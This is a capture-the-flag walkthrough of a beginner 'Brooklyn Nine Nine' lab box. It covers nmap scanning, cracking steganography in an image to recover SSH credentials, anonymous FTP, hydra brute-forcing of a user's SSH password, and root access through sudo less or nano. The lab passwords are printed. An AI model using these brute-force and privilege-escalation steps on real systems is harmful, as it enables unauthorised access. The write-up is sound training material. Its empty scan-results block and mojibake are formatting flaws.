This is a **Brooklyn Nine Nine** themed CTF, designed for beginners. Letâ€™s jump into it and check out this machine.



## Nmap Scan

Scanning the machine with Nmap:

```bash
nmap -sVC -p- IP
````

### Results

```

We have three interesting services:

* **Apache web server (80)**
* **Anonymous FTP (21)**
* **SSH (22)**

---

## Enumeration

### Port 80 - Web Server

* The website displays a **B99 banner**.
* Looking at the source code, we find an image: `brooklyn99.jpg`.

```bash
wget http://IP/brooklyn99.jpg
```

* The page hints at **steganography**.

We use `stegcracker` to analyze the image:

```bash
stegcracker brooklyn99.jpg ~/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
```

**Result:**

```
Successfully cracked file with password: admin
Your file has been written to: brooklyn99.jpg.out
```

```bash
cat brooklyn99.jpg.out
```

Output:

```
Holts Password:
fluffydog12@ninenine
```

So we have **credentials for SSH**.

---

### Port 21 - Anonymous FTP

Login using:

```bash
ftp IP
# username: anonymous
# password: anonymous
```

We find a file: `note_to_jake.txt`.

Contents:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

---

### Port 22 - SSH

Using Holtâ€™s credentials:

```bash
ssh holt@IP
# password: fluffydog12@ninenine
```

We get access to Holtâ€™s account. Inside, we find:

* `user.txt` âœ… (user flag)
* `nano.save` (restricted to root)

Checking `/etc/passwd`, we discover two more potential users: **jake** & **amy**.

---

## Privilege Escalation

### Brute-forcing Jakeâ€™s Password

We try brute-forcing Jakeâ€™s SSH login:

```bash
hydra -l jake -P ~/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://IP
```

**Result:**

```
[22][ssh] host: IP   login: jake   password: 987654321
```

We can now login as Jake:

```bash
ssh jake@IP
# password: 987654321
```

### Sudo Privileges

Checking Jakeâ€™s privileges:

```bash
sudo -l
```

Jake has sudo access for `less`. Using this, we can read rootâ€™s flag:

```bash
sudo less /root/root.txt
```

Flag:

```
Here is the flag: xxxxxxxxxxxxxxxxxxxxxxxxxx
```

âœ… **Root access achieved!**

---

## Alternate Method

* From Holtâ€™s account, running `sudo -l` shows sudo access for `nano`.
* Escalation to root can also be done using **nano**.

---

## Conclusion

We successfully rooted the **Brooklyn Nine Nine CTF** box by:

1. Enumerating services with Nmap
2. Extracting Holtâ€™s SSH credentials via steganography
3. Using Anonymous FTP to confirm Jakeâ€™s weak password
4. Brute-forcing Jakeâ€™s account with Hydra
5. Escalating privileges to root using `less` (or `nano`)

ðŸŽ‰ **Box pwned!**
